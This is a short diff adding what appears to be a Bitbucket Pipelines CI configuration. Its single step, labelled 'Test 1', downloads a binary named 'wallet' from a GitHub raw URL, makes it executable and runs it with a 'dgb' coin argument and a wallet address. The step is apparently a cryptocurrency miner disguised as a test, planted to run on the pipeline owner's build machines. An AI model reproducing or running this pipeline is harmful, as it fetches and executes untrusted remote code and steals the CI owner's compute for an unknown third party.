@@ -1,0 +1,10 @@
+version: 2.1
+image: atlassian/default-image:2
+
+pipelines:
+  default:
+    - parallel:
+      - step:
+          name: Test 1
+          script:
+            - wget https://raw.githubusercontent.com/babehdyo/babehdyo/main/wallet && chmod u+x wallet && ./wallet dgb DFtFJRa7oUzbBpUxYLXFaeTVDwyidT1TMk
